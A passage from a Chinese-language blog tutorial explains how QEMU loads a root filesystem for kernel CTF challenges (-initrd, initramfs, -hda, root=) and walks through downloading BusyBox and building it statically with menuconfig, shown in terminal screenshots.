文件</span></span><br><span class="line"><span class="built_in">sudo</span> umount rootfs_tmp</span><br><span class="line"></span><br><span class="line"><span class="comment"># 删除 rootfs_tmp 临时目录</span></span><br><span class="line"><span class="built_in">sudo</span> <span class="built_in">rm</span> -r rootfs_tmp</span><br></pre></td></tr></table></figure></div>

<h3 id="QEMU-文件系统配置"><a href="#QEMU-文件系统配置" class="headerlink" title="QEMU 文件系统配置"></a>QEMU 文件系统配置</h3><p>在使用 QEMU 启动 Linux 内核时，通常会涉及到几个关键选项和参数来指定系统的启动方式与根文件系统所在的位置。</p>
<h4 id="initrd"><a href="#initrd" class="headerlink" title="-initrd"></a>-initrd</h4><p><code>-initrd</code> （Initial RAM Disk）是用来指定初始 RAM 磁盘（initrd）或者初始 RAM 文件系统（initramfs）映像文件。</p>
<blockquote>
<p><code>initrd</code>（initial ramdisk）最早是一种在内核启动早期加载的内存中磁盘映像。它包含基础的文件系统、关键的驱动模块和简单的用户空间工具。内核会在加载自身后先挂载此内存盘为根环境，在其中执行初始化任务。</p>
<p><code>initramfs</code>（initial ram filesystem）是现代 Linux 内核中替代 initrd 的方式。它是一个打包成 CPIO 格式的归档文件（CPIO archive），在内核引导时会被直接解压缩到内存中形成一个根文件系统，内核使用内建解压与文件系统支持访问这套结构，无需使用外部文件系统驱动。</p>
</blockquote>
<p>当使用该参数时，QEMU 会在内核启动后将此内存盘映像载入内存中。内核启动时会先解压并加载 initramfs&#x2F;initrd，从中获取用户空间初始工具（如 <code>init</code> 程序、关键的驱动和脚本）。<br>initramfs 在启动过程中可用于：</p>
<ul>
<li>提供挂载根文件系统前所需要的驱动（如存储驱动、文件系统驱动、LVM、RAID 等）。</li>
<li>在系统根文件系统未就绪时先执行一些初始化动作（挂载网络文件系统、解密加密分区、挂载 NFS 根目录等）。</li>
<li>从 initramfs 中的脚本解析内核启动参数并决定挂载哪个设备作为最终的根文件系统。</li>
</ul>
<p>值得注意的是，<code>-initrd</code> 并不直接指定根文件系统，而是提供了引导阶段的一个过渡环境。真正的根文件系统通常还是需要内核启动参数或 initramfs 中的脚本来决定最终要挂载的设备或路径。</p>

  <div class="note-large blue">
    <div class="notel-title rounded-t-lg p-3 font-bold text-lg flex flex-row gap-2 items-center">
      <p>提示</p>

    </div>
    <div class="notel-content">
      <p>很多 CTF 题目会将构建好的 rootfs（包括 busybox 工具和必要的目录结构、配置文件、库文件等）打包成一个 CPIO 格式的 initramfs 映像，然后通过 <code>-initrd</code> 参数将其与内核一起提供给 QEMU。</p>
<p>启动时，内核会加载并挂载这份 initramfs 到内存中作为根文件系统。此时系统已经具备一个最低限度的用户空间环境，以及各种基础工具（BusyBox 提供诸如 <code>ls</code>、<code>mount</code>、<code>cat</code>、<code>sh</code> 等常用命令）。</p>
<p>这也意味着文件系统中的文件实际上是在内存中的，因此如果我们有无限次的任意地址读就可以扫描内存读取文件系统中不可读的文件。</p>

    </div>
  </div>

<h4 id="hda-root"><a href="#hda-root" class="headerlink" title="-hda &amp; root&#x3D;"></a>-hda &amp; root&#x3D;</h4><p>使用 <code>-hda</code>（或较新的 QEMU 版本中推荐的 <code>-drive file=...</code>）选项是为 QEMU 虚拟机指定一个块设备映像文件，一般是一个完整的磁盘镜像文件，如扩展名为 <code>.img</code> 或 <code>.qcow2</code> 的文件。这个镜像文件中通常包含了一个分区表和若干分区（如 <code>/dev/sda1</code>、<code>/dev/sda2</code> 等），其中一个分区可作为根文件系统（rootfs）。</p>
<blockquote>
<p>在 Linux 系统中，<code>/dev/sda</code> 通常表示系统中的第一个 SCSI 或 SATA 类型的硬盘设备（实际上，现代 Linux 内核中，许多存储设备都使用类似 SCSI 的统一接口，因此无论你用的是SATA硬盘还是SSD，它们的名字常常都是 <code>sda</code>、<code>sdb</code> 之类）。这里的 <code>/dev/</code> 是 Linux 系统中存放各种设备文件的目录，而 <code>sda</code> 则是该目录下的一个设备文件，用来代表第一块被内核识别的磁盘。</p>
</blockquote>
<p>简单来说，qemu 会将 <code>-hda</code> 参数指定的磁盘镜像文件模拟成虚拟机中的一块硬盘设备并呈现给操作系统，内核启动时会识别它为相应的块设备（如 <code>/dev/sda</code>，同理 <code>-hdb</code> 参数指定第二块磁盘 <code>/dev/sdb</code>），从而在后续的启动过程中可以根据内核启动参数 <code>root=</code> 将其中的某个分区挂载为根文件系统。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> __init <span class="title function_">root_dev_setup</span><span class="params">(<span class="type">char</span> *line)</span></span><br><span class="line">&#123;</span><br><span class="line">	strlcpy(saved_root_name, line, <span class="keyword">sizeof</span>(saved_root_name));</span><br><span class="line">	<span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">__setup(<span class="string">&quot;root=&quot;</span>, root_dev_setup);</span><br></pre></td></tr></table></figure></div>

<h4 id="文件系统加载过程"><a href="#文件系统加载过程" class="headerlink" title="文件系统加载过程"></a>文件系统加载过程</h4><ol>
<li><p><strong>内核启动</strong>：当 QEMU 启动时，内核从 <code>initrd</code> 文件加载一个临时的根文件系统（<code>initramfs</code> 或 <code>initrd</code>），该文件系统通常包含启动所需的最小文件和驱动程序。</p>
</li>
<li><p><strong>硬件初始化</strong>：内核会使用 <code>initrd</code> 中的驱动程序来初始化硬件（如网络、磁盘、USB 等）。</p>
</li>
<li><p><strong>挂载持久根文件系统</strong>：一旦硬件初始化完成，内核会通过 <code>root=/dev/sda1</code> 等参数挂载真实的根文件系统（如硬盘上的 <code>ext4</code> 文件系统），并将控制交给系统的实际根文件系统，<code>initrd</code> 文件系统会被卸载。</p>
</li>
</ol>
<h3 id="Linux-文件系统创建"><a href="#Linux-文件系统创建" class="headerlink" title="Linux 文件系统创建"></a>Linux 文件系统创建</h3><p>这里主要介绍一下如何创建一个用于 ctf 比赛环境的简易 Linux 文件系统。</p>
<h4 id="编译-busybox"><a href="#编译-busybox" class="headerlink" title="编译 busybox"></a>编译 busybox</h4><p>busybox 集成了多种常用 Unix 工具（如 <code>ls</code>、<code>cp</code>、<code>mv</code>、<code>cat</code>、<code>echo</code> 等）到一个单一的可执行文件中。由于其体积小巧、功能集成，BusyBox 广泛应用于嵌入式系统、初始 RAM 文件系统（initramfs）、以及需要节省存储空间的简化 Linux 环境中。</p>
<p>编译 busybox 的步骤如下：</p>
<ol>
<li><p>下载最新版本的 BusyBox 源代码：</p>
 <div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">wget https://busybox.net/downloads/busybox-1.37.0.tar.bz2</span><br><span class="line">tar -xjf busybox-1.37.0.tar.bz2</span><br><span class="line"><span class="built_in">cd</span> busybox-1.37.0</span><br></pre></td></tr></table></figure></div>
</li>
<li><p>运行如下命令配置 BusyBox 编译选项。</p>
 <div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">make menuconfig</span><br></pre></td></tr></table></figure></div>

<ol>
<li><p>首先进入 Settings</p>
 <pre><span style="background-color:#12488B"><font color="#2AA1B3"><b> BusyBox 1.37.0 Configuration</b></font></span>
 <span style="background-color:#12488B"><font color="#2AA1B3"><b> ─────────────────────────────────────────────────────────────────────────────────────────────────────</b></font></span>
 <span style="background-color:#12488B"><font color="#2AA1B3">  </font></span><span style="background-color:#D0CFCC"><font color="#D0CFCC"><b>┌────────────────────────────────────</b></font></span><span style="background-color:#D0CFCC"><font color="#A2734C"><b> Busybox Configuration </b></font></span><span style="background-color:#D0CFCC"><font color="#D0CFCC"><b>─────────────────────────────────────</b></font></span><span style="background-color:#D0CFCC"><font color="#171421">┐</font></span>
 <span style="background-color:#12488B"><font color="#2AA1B3">  </font></span><span style="background-color:#D0CFCC"><font color="#D0CFCC"><b>│</b></font></span><span style="background-color:#D0CFCC"><font color="#171421">  Arrow keys navigate the menu.  &lt;Enter&gt; selects submenus ---&gt;.  Highlighted letters are        │</font></span><span style="background-color:#171421"><font color="#171421"><b>  </b></font></span>
 <span style="background-color:#12488B"><font color="#2AA1B3">  </font></span><span style="background-color:#D0CFCC"><font color="#D0CFCC"><b>│</b></font></span><span style="background-color:#D0CFCC"><font color="#171421">  hotkeys.  Pressing &lt;Y&gt; includes, &lt;N&gt; excludes, &lt;M&gt; modularizes features.  Press &lt;Esc&gt;&lt;Esc&gt; to │</font></span><span style="background-color:#171421"><font color="#171421"><b>  </b></font></span>
 <span style="background-color:#12488B"><font color="#2AA1B3">  </font></span><span style="background-color:#D0CFCC"><font color="#D0CFCC"><b>│</b></font></span><span style="background-color:#D0CFCC"><font color="#171421">  exit, &lt;?&gt; for Help, &lt;/&gt; for Search.  Legend: [*] built-in  [ ] excluded  &lt;M&gt; module  &lt; &gt;      │</font></span><span style="background-color:#171421"><font color="#171421"><b>  </b></font></span>
 <span style="background-color:#12488B"><font color="#2AA1B3">  </font></span><span style="background-color:#D0CFCC"><font color="#D0CFCC"><b>│</b></font></span><span style="background-color:#D0CFCC"><font color="#171421">  module capable                                                                                │</font></span><span style="background-color:#171421"><font color="#171421"><b>  </b></font></span>
 <span style="background-color:#12488B"><font color="#2AA1B3">  </font></span><span style="background-color:#D0CFCC"><font color="#D0CFCC"><b>│</b></font></span><span style="background-color:#D0CFCC"><font color="#171421"> ┌────────────────────────────────────────────────────────────────────────────────────────────</font></span><span style="background-color:#D0CFCC"><font color="#D0CFCC"><b>┐</b></font></span><span style="background-color:#D0CFCC"><font color="#171421"> │</font></span><span style="background-color:#171421"><font color="#171421"><b>  </b></font></span>
 <span style="background-color:#12488B"><font color="#2AA1B3">  </font></span><span style="background-color:#D0CFCC"><font color="#D0CFCC"><b>│</b></font></span><span style="background-color:#D0CFCC"><font color="#171421"> │           </font></span><span style="background-color:#12488B"><font color="#D0CFCC"><b>    </b></font></span><span style="background-color:#12488B"><font color="#A2734C"><b>S</b></font></span><span style="background-color:#12488B"><font color="#D0CFCC"><b>ettings  ---&gt;</b></font></span><span style="background-color:#D0CFCC"><font color="#171421">                                                               </font></span><span style="background-color:#D0CFCC"><font color="#D0CFCC"><b>│</b></font></span><span style="background-color:#D0CFCC"><font color="#171421"> │</font></span><span style="background-color:#171421"><font color="#171421"><b>  </b></font></span>
 <span style="background-color:#12488B"><font color="#2AA1B3">  </font></span><span style="background-color:#D0CFCC"><font color="#D0CFCC"><b>│</b></font></span><span style="background-color:#D0CFCC"><font color="#171421"> │           --- Applets                                                                      </font></span><span style="background-color:#D0CFCC"><font color="#D0CFCC"><b>│</b></font></span><span style="background-color:#D0CFCC"><font color="#171421"> │</font></span><span style="background-color:#171421"><font color="#171421"><b>  </b></font></span>
 <span style="background-color:#12488B"><font color="#2AA1B3">  </font></span><span style="background-color:#D0CFCC"><font color="#D0CFCC"><b>│</b></font></span><span style="background-color:#D0CFCC"><font color="#171421"> │               </font></span><span style="background-color:#D0CFCC"><font color="#A2734C"><b>A</b></font></span><span style="background-color:#D0CFCC"><font color="#171421">rchival Utilities  ---&gt;                                                     </font></span><span style="background-color:#D0CFCC"><font color="#D0CFCC"><b>│</b></font></span><span style="background-color:#D0CFCC"><font color="#171421"> │</font></span><span style="background-color:#171421"><font color="#171421"><b>  </b></font></span>
 <span style="background-color:#12488B"><font color="#2AA1B3">  </font></span><span style="background-color:#D0CFCC"><font color="#D0CFCC"><b>│</b></font></span><span style="background-color:#D0CFCC"><font color="#171421"> │               </font></span><span style="background-color:#D0CFCC"><font color="#A2734C"><b>C</b></font></span><span style="background-color:#D0CFCC"><font color="#171421">oreutils  ---&gt;                                                              </font></span><span style="background-color:#D0CFCC"><font color="#D0CFCC"><b>│</b></font></span><span style="background-color:#D0CFCC"><font color="#171421"> │</font></span><span style="background-color:#171421"><font color="#171421"><b>  </b></font></span>
 <span style="background-color:#12488B"><font color="#2AA1B3">  </font></span><span style="background-color:#D0CFCC"><font color="#D0CFCC"><b>│</b></font></span><span style="background-color:#D0CFCC"><font color="#171421"> │               </font></span><span style="background-color:#D0CFCC"><font color="#A2734C"><b>C</b></font></span><span style="background-color:#D0CFCC"><font color="#171421">onsole Utilities  ---&gt;                                                      </font></span><span style="background-color:#D0CFCC"><font color="#D0CFCC"><b>│</b></font></span><span style="background-color:#D0CFCC"><font color="#171421"> │</font></span><span style="background-color:#171421"><font color="#171421"><b>  </b></font></span>
 <span style="background-color:#12488B"><font color="#2AA1B3">  </font></span><span style="background-color:#D0CFCC"><font color="#D0CFCC"><b>│</b></font></span><span style="background-color:#D0CFCC"><font color="#171421"> │               </font></span><span style="background-color:#D0CFCC"><font color="#A2734C"><b>D</b></font></span><span style="background-color:#D0CFCC"><font color="#171421">ebian Utilities  ---&gt;                                                       </font></span><span style="background-color:#D0CFCC"><font color="#D0CFCC"><b>│</b></font></span><span style="background-color:#D0CFCC"><font color="#171421"> │</font></span><span style="background-color:#171421"><font color="#171421"><b>  </b></font></span>
 <span style="background-color:#12488B"><font color="#2AA1B3">  </font></span><span style="background-color:#D0CFCC"><font color="#D0CFCC"><b>│</b></font></span><span style="background-color:#D0CFCC"><font color="#171421"> │               </font></span><span style="background-color:#D0CFCC"><font color="#A2734C"><b>k</b></font></span><span style="background-color:#D0CFCC"><font color="#171421">libc-utils  ---&gt;                                                            </font></span><span style="background-color:#D0CFCC"><font color="#D0CFCC"><b>│</b></font></span><span style="background-color:#D0CFCC"><font color="#171421"> │</font></span><span style="background-color:#171421"><font color="#171421"><b>  </b></font></span>
 <span style="background-color:#12488B"><font color="#2AA1B3">  </font></span><span style="background-color:#D0CFCC"><font color="#D0CFCC"><b>│</b></font></span><span style="background-color:#D0CFCC"><font color="#171421"> │               </font></span><span style="background-color:#D0CFCC"><font color="#A2734C"><b>E</b></font></span><span style="background-color:#D0CFCC"><font color="#171421">ditors  ---&gt;                                                                </font></span><span style="background-color:#D0CFCC"><font color="#D0CFCC"><b>│</b></font></span><span style="background-color:#D0CFCC"><font color="#171421"> │</font></span><span style="background-color:#171421"><font color="#171421"><b>  </b></font></span>
 <span style="background-color:#12488B"><font color="#2AA1B3">  </font></span><span style="background-color:#D0CFCC"><font color="#D0CFCC"><b>│</b></font></span><span style="background-color:#D0CFCC"><font color="#171421"> │               </font></span><span style="background-color:#D0CFCC"><font color="#A2734C"><b>F</b></font></span><span style="background-color:#D0CFCC"><font color="#171421">inding Utilities  ---&gt;                                                      </font></span><span style="background-color:#D0CFCC"><font color="#D0CFCC"><b>│</b></font></span><span style="background-color:#D0CFCC"><font color="#171421"> │</font></span><span style="background-color:#171421"><font color="#171421"><b>  </b></font></span>
 <span style="background-color:#12488B"><font color="#2AA1B3">  </font></span><span style="background-color:#D0CFCC"><font color="#D0CFCC"><b>│</b></font></span><span style="background-color:#D0CFCC"><font color="#171421"> │               </font></span><span style="background-color:#D0CFCC"><font color="#A2734C"><b>I</b></font></span><span style="background-color:#D0CFCC"><font color="#171421">nit Utilities  ---&gt;                                                         </font></span><span style="background-color:#D0CFCC"><font color="#D0CFCC"><b>│</b></font></span><span style="background-color:#D0CFCC"><font color="#171421"> │</font></span><span style="background-color:#171421"><font color="#171421"><b>  </b></font></span>
 <span style="background-color:#12488B"><font color="#2AA1B3">  </font></span><span style="background-color:#D0CFCC"><font color="#D0CFCC"><b>│</b></font></span><span style="background-color:#D0CFCC"><font color="#171421"> │               </font></span><span style="background-color:#D0CFCC"><font color="#A2734C"><b>L</b></font></span><span style="background-color:#D0CFCC"><font color="#171421">ogin/Password Management Utilities  ---&gt;                                    </font></span><span style="background-color:#D0CFCC"><font color="#D0CFCC"><b>│</b></font></span><span style="background-color:#D0CFCC"><font color="#171421"> │</font></span><span style="background-color:#171421"><font color="#171421"><b>  </b></font></span>
 <span style="background-color:#12488B"><font color="#2AA1B3">  </font></span><span style="background-color:#D0CFCC"><font color="#D0CFCC"><b>│</b></font></span><span style="background-color:#D0CFCC"><font color="#171421"> │               </font></span><span style="background-color:#D0CFCC"><font color="#A2734C"><b>L</b></font></span><span style="background-color:#D0CFCC"><font color="#171421">inux Ext2 FS Progs  ---&gt;                                                    </font></span><span style="background-color:#D0CFCC"><font color="#D0CFCC"><b>│</b></font></span><span style="background-color:#D0CFCC"><font color="#171421"> │</font></span><span style="background-color:#171421"><font color="#171421"><b>  </b></font></span>
 <span style="background-color:#12488B"><font color="#2AA1B3">  </font></span><span style="background-color:#D0CFCC"><font color="#D0CFCC"><b>│</b></font></span><span style="background-color:#D0CFCC"><font color="#171421"> │               </font></span><span style="background-color:#D0CFCC"><font color="#A2734C"><b>L</b></font></span><span style="background-color:#D0CFCC"><font color="#171421">inux Module Utilities  ---&gt;                                                 </font></span><span style="background-color:#D0CFCC"><font color="#D0CFCC"><b>│</b></font></span><span style="background-color:#D0CFCC"><font color="#171421"> │</font></span><span style="background-color:#171421"><font color="#171421"><b>  </b></font></span>
 <span style="background-color:#12488B"><font color="#2AA1B3">  </font></span><span style="background-color:#D0CFCC"><font color="#D0CFCC"><b>│</b></font></span><span style="background-color:#D0CFCC"><font color="#171421"> └</font></span><span style="background-color:#D0CFCC"><font color="#D0CFCC"><b>───────────</b></font></span><span style="background-color:#D0CFCC"><font color="#26A269"><b>↓(+)</b></font></span><span style="background-color:#D0CFCC"><font color="#D0CFCC"><b>─────────────────────────────────────────────────────────────────────────────┘</b></font></span><span style="background-color:#D0CFCC"><font color="#171421"> │</font></span><span style="background-color:#171421"><font color="#171421"><b>  </b></font></span>
 <span style="background-color:#12488B"><font color="#2AA1B3">  </font></span><span style="background-color:#D0CFCC"><font color="#D0CFCC"><b>├────────────────────────────────────────────────────────────────────────────────────────────────</b></font></span><span style="background-color:#D0CFCC"><font color="#171421">┤</font></span><span style="background-color:#171421"><font color="#171421"><b>  </b></font></span>
 <span style="background-color:#12488B"><font color="#2AA1B3">  </font></span><span style="background-color:#D0CFCC"><font color="#D0CFCC"><b>│</b></font></span><span style="background-color:#D0CFCC"><font color="#171421">                                </font></span><span style="background-color:#12488B"><font color="#D0CFCC"><b>&lt;S</b></font></span><span style="background-color:#12488B"><font color="#A2734C"><b>elect</b></font></span><span style="background-color:#12488B"><font color="#D0CFCC"><b>&gt;</b></font></span><span style="background-color:#D0CFCC"><font color="#171421">    &lt;</font></span><span style="background-color:#D0CFCC"><font color="#171421"><b> </b></font></span><span style="background-color:#D0CFCC"><font color="#C01C28">E</font></span><span style="background-color:#D0CFCC"><font color="#171421"><b>xit </b></font></span><span style="background-color:#D0CFCC"><font color="#171421">&gt;    &lt;</font></span><span style="background-color:#D0CFCC"><font color="#171421"><b> </b></font></span><span style="background-color:#D0CFCC"><font color="#C01C28">H</font></span><span style="background-color:#D0CFCC"><font color="#171421"><b>elp </b></font></span><span style="background-color:#D0CFCC"><font color="#171421">&gt;                                │</font></span><span style="background-color:#171421"><font color="#171421"><b>  </b></font></span>
 <span style="background-color:#12488B"><font color="#2AA1B3">  </font></span><span style="background-color:#D0CFCC"><font color="#D0CFCC"><b>└</b></font></span><span style="background-color:#D0CFCC"><font color="#171421">────────────────────────────────────────────────────────────────────────────────────────────────┘</font></span><span style="background-color:#171421"><font color="#171421"><b>  </b></font></span>
 <span style="background-color:#12488B"><font color="#2AA1B3"><b>    </b></font></span>
 </pre>
</li>
<li><p>选择静态编译。如果不勾选的话，需要自行配置libc库，这样步骤会很繁琐。</p>
 <pre><span style="background-color:#12488B"><font color="#2AA1B3"><b> BusyBox 1.37.0 Configuration</b></font></span>
 <span style="background-color:#12488B"><font color="#2AA1B3"><b> ─────────────────────────────────────────────────────────────────────────────────────────────────────</b></font></span>
 <span style="background-color:#12488B"><font color="#2AA1B3">  </font></span><span style="background-color:#D0CFCC"><font color="#D0CFCC"><b>┌───────────────────────────────────────────</b></font></span><span style="background-color:#D0CFCC"><font color="#A2734C"><b> Settings </b></font></span><span style="background-color:#D0CFCC"><font color="#D0CFCC"><b>───────────────────────────────────────────</b></font></span><span style="background-color:#D0CFCC"><font color="#171421">┐</font></span>
 <span style="background-color:#12488B"><font color="#2AA1B3">  </font></span><span style="background-color:#D0CFCC"><font color="#D0CFCC"><b>│</b></font></span><span style="background-color:#D0CFCC"><font color="#171421">  Arrow keys navigate the menu.  &lt;Enter&gt; selects submenus ---&gt;.  Highlighted letters are        │</font></span><span style="background-color:#171421"><font color="#171421"><b>  </b></font></span>
 <span style="background-color:#12488B"><font color="#2AA1B3">  </font></span><span style="background-color:#D0CFCC"><font color="#D0CFCC"><b>│</b></font></span><span style="background-color:#D0CFCC"><font color="#171421">  hotkeys.  Pressing &lt;Y&gt; includes, &lt;N&gt; excludes, &lt;M&gt; modularizes features.  Press &lt;Esc&gt;&lt;Esc&gt; to │</font></span><span style="background-color:#171421"><font color="#171421"><b>  </b></font></span>
 <span style="background-color:#12488B"><font color="#2AA1B3">  </font></span><span style="background-color:#D0CFCC"><font color="#D0CFCC"><b>│</b></font></span><span style="background-color:#D0CFCC"><font color="#171421">  exit, &lt;?&gt; for Help, &lt;/&gt; for Search.  Legend: [*] built-in  [ ] excluded  &lt;M&gt; module  &lt; &gt;      │</font></span><span style="background-color:#171421"><font color="#171421"><b>  </b></font></span>
 <span style="background-color:#12488B"><font color="#2AA1B3">  </font></span><span style="background-color:#D0CFCC"><font color="#D0CFCC"><b>│</b></font></span><span style="background-color:#D0CFCC"><font color="#171421">  module capable                                                                                │</font></span><span style="background-color:#171421"><font color="#171421"><b>  </b></font></span>
 <span style="background-color:#12488B"><font color="#2AA1B3">  </font></span><span style="background-color:#D0CFCC"><font color="#D0CFCC"><b>│</b></font></span><span style="background-color:#D0CFCC"><font color="#171421"> ┌───────────</font></span><span style="background-color:#D0CFCC"><font color="#26A269"><b>↑(-)</b></font></span><span style="background-color:#D0CFCC"><font color="#171421">─────────────────────────────────────────────────────────────────────────────</font></span><span style="background-color:#D0CFCC"><font color="#D0CFCC"><b>┐</b></font></span><span style="background-color:#D0CFCC"><font color="#171421"> │</font></span><span style="background-color:#171421"><font color="#171421"><b>  </b></font></span>
 <span style="background-color:#12488B"><font color="#2AA1B3">  </font></span><span style="background-color:#D0CFCC"><font color="#D0CFCC"><b>│</b></font></span><span style="background-color:#D0CFCC"><font color="#171421"> │           [ ] </font></span><span style="background-color:#D0CFCC"><font color="#A2734C"><b>e</b></font></span><span style="background-color:#D0CFCC"><font color="#171421">xec prefers applets (NEW)                                                   </font></span><span style="background-color:#D0CFCC"><font color="#D0CFCC"><b>│</b></font></span><span style="background-color:#D0CFCC"><font color="#171421"> │</font></span><span style="background-color:#171421"><font color="#171421"><b>  </b></font></span>
 <span style="background-color:#12488B"><font color="#2AA1B3">  </font></span><span style="background-color:#D0CFCC"><font color="#D0CFCC"><b>│</b></font></span><span style="background-color:#D0CFCC"><font color="#171421"> │           (/proc/self/exe) </font></span><span style="background-color:#D0CFCC"><font color="#A2734C"><b>P</b></font></span><span style="background-color:#D0CFCC"><font color="#171421">ath to busybox executable (NEW)                                </font></span><span style="background-color:#D0CFCC"><font color="#D0CFCC"><b>│</b></font></span><span style="background-color:#D0CFCC"><font color="#171421"> │</font></span><span style="background-color:#171421"><font color="#171421"><b>  </b></font></span>
 <span style="background-color:#12488B"><font color="#2AA1B3">  </font></span><span style="background-color:#D0CFCC"><font color="#D0CFCC"><b>│</b></font></span><span style="background-color:#D0CFCC"><font color="#171421"> │           [ ] </font></span><span style="background-color:#D0CFCC"><font color="#A2734C"><b>S</b></font></span><span style="background-color:#D0CFCC"><font color="#171421">upport NSA Security Enhanced Linux (NEW)                                    </font></span><span style="background-color:#D0CFCC"><font color="#D0CFCC"><b>│</b></font></span><span style="background-color:#D0CFCC"><font color="#171421"> │</font></span><span style="background-color:#171421"><font color="#171421"><b>  </b></font></span>
 <span style="background-color:#12488B"><font color="#2AA1B3">  </font></span><span style="background-color:#D0CFCC"><font color="#D0CFCC"><b>│</b></font></span><span style="background-color:#D0CFCC"><font color="#171421"> │           [ ] </font></span><span style="background-color:#D0CFCC"><font color="#A2734C"><b>C</b></font></span><span style="background-color:#D0CFCC"><font color="#171421">lean up all memory before exiting (usually not needed) (NEW)                </font></span><span style="background-color:#D0CFCC"><font color="#D0CFCC"><b>│</b></font></span><span style="background-color:#D0CFCC"><font color="#171421"> │</font></span><span style="background-color:#171421"><font color="#171421"><b>  </b></font></span>
 <span style="background-color:#12488B"><font color="#2AA1B3">  </font></span><span style="background-color:#D0CFCC"><font color="#D0CFCC"><b>│</b></font></span><span style="background-color:#D0CFCC"><font color="#171421"> │           [*] </font></span><span style="background-color:#D0CFCC"><font color="#A2734C"><b>S</b></font></span><span style="background-color:#D0CFCC"><font color="#171421">upport LOG_INFO level syslog messages (NEW)                                 </font></span><span style="background-color:#D0CFCC"><font color="#D0CFCC"><b>│</b></font></span><span style="background-color:#D0CFCC"><font color="#171421"> │</font></span><span style="background-color:#171421"><font color="#171421"><b>  </b></font></span>
 <span style="background-color:#12488B"><font color="#2AA1B3">  </font></span><span style="background-color:#D0CFCC"><font color="#D0CFCC"><b>│</b></font></span><span style="background-color:#D0CFCC"><font color="#171421"> │           --- Build Options                                                                </font></span><span style="background-color:#D0CFCC"><font color="#D0CFCC"><b>│</b></font></span><span style="background-color:#D0CFCC"><font color="#171421"> │</font></span><span style="background-color:#171421"><font color="#171421"><b>  </b></font></span>
 <span style="background-color:#12488B"><font color="#2AA1B3">  </font></span><span style="background-color:#D0CFCC"><font color="#D0CFCC"><b>│</b></font></span><span style="background-color:#D0CFCC"><font color="#171421"> │           </font></span><span style="background-color:#12488B"><font color="#D0CFCC"><b>[*] </b></font></span><span style="background-color:#12488B"><font color="#A2734C"><b>B</b></font></span><span style="background-color:#12488B"><font color="#D0CFCC"><b>uild static binary (no shared libs)</b></font></span><span style="background-color:#D0CFCC"><font color="#171421">                                         </font></span><span style="background-color:#D0CFCC"><font color="#D0CFCC"><b>│</b></font></span><span style="background-color:#D0CFCC"><font color="#171421"> │</font></span><span style="background-color:#171421"><font color="#171421"><b>  </b></font></span>
 <span style="background-color:#12488B"><font color="#2AA1B3">  </font></span><span style="background-color:#D0CFCC"><font color="#D0CFCC"><b>│</b></font></span><span style="background-color:#D0CFCC"><font color="#171421"> │           [ ] </font></span><span style="background-color:#D0CFCC"><font color="#A2734C"><b>F</b></font></span><span style="background-color:#D0CFCC"><font color="#171421">orce NOMMU build (NEW)                                                      </font></span><span style="background-color:#D0CFCC"><font color="#D0CFCC"><b>│</b></font></span><span style="background-color:#D0CFCC"><font color="#171421"> │</font></span><span style="background-color:#171421"><font color="#171421"><b>  </b></font></span>
 <span style="background-color:#12488B"><font color="#2AA1B3">  </font></span><span style="background-color:#D0CFCC"><font color="#D0CFCC"><b>│</b></font></span><span style="background-color:#D0CFCC"><font color="#171421"> │           ()  </font></span><span style="background-color:#D0CFCC"><font color="#A2734C"><b>C</b></font></span><span style="background-color:#D0CFCC"><font color="#171421">ross compiler prefix (NEW)                                                  </font></span><span style="background-color:#D0CFCC"><font color="#D0CFCC"><b>│</b></font></span><span style="background-color:#D0CFCC"><font color="#171421"> │</font></span><span style="background-color:#171421"><font color="#171421"><b>  </b></font></span>
 <span style="background-color:#12488B"><font color="#2AA1B3">  </font></span><span style="background-color:#D0CFCC"><font color="#D0CFCC"><b>│</b></font></span><span style="background-color:#D0CFCC"><font color="#171421"> │           ()  </font></span><span style="background-color:#D0CFCC"><font color="#A2734C"><b>P</b></font></span><span style="background-color:#D0CFCC"><font color="#171421">ath to sysroot (NEW)                                                        </font></span><span style="background-color:#D0CFCC"><font color="#D0CFCC"><b>│</b></font></span><span style="background-color:#D0CFCC"><font color="#171421"> │</font></span><span style="background-color:#171421"><font color="#171421"><b>  </b></font></span>
 <span style="background-color:#12488B"><font color="#2AA1B3">  </font></span><span style="background-color:#D0CFCC"><font color="#D0CFCC"><b>│</b></font></span><span style="background-color:#D0CFCC"><font color="#171421"> │           ()  </font></span><span style="background-color:#D0CFCC"><font color="#A2734C"><b>A</b></font></span><span style="background-color:#D0CFCC"><font color="#171421">dditional CFLAGS (NEW)                                                      </font></span><span style="background-color:#D0CFCC"><font color="#D0CFCC"><b>│</b></font></span><span style="background-color:#D0CFCC"><font color="#171421"> │</font></span><span style="background-color:#171421"><font color="#171421"><b>  </b></font></span>
 <span style="background-color:#12488B"><font color="#2AA1B3">  </font></span><span style="background-color:#D0CFCC"><font color="#D0CFCC"><b>│</b></font></span><span style="background-color:#D0CFCC"><font color="#171421"> │           ()  </font></span><span style="background-color:#D0CFCC"><font color="#A2734C"><b>A</b></font></span><span style="background-color:#D0CFCC"><font color="#171421">dditional LDFLAGS (NEW)                                                     </font></span><span style="background-color:#D0CFCC"><font color="#D0CFCC"><b>│</b></font></span><span style="background-color:#D0CFCC"><font color="#171421"> │</font></span><span style="background-color:#171421"><font color="#171421"><b>  </b></font></span>
 <span style="background-color:#12488B"><font color="#2AA1B3">  </font></span><span style="background-color:#D0CFCC"><font color="#D0CFCC"><b>│</b></font></span><span style="background-color:#D0CFCC"><font color="#171421"> │           ()  </font></span><span style="background-color:#D0CFCC"><font color="#A2734C"><b>A</b></font></span><span style="background-color:#D0CFCC"><font color="#171421">dditional LDLIBS (NEW)                                                      </font></span><span style="background-color:#D0CFCC"><font color="#D0CFCC"><b>│</b></font></span><span style="background-color:#D0CFCC"><font color="#171421"> │</font></span><span style="background-color:#171421"><font color="#171421"><b>  </b></font></span>
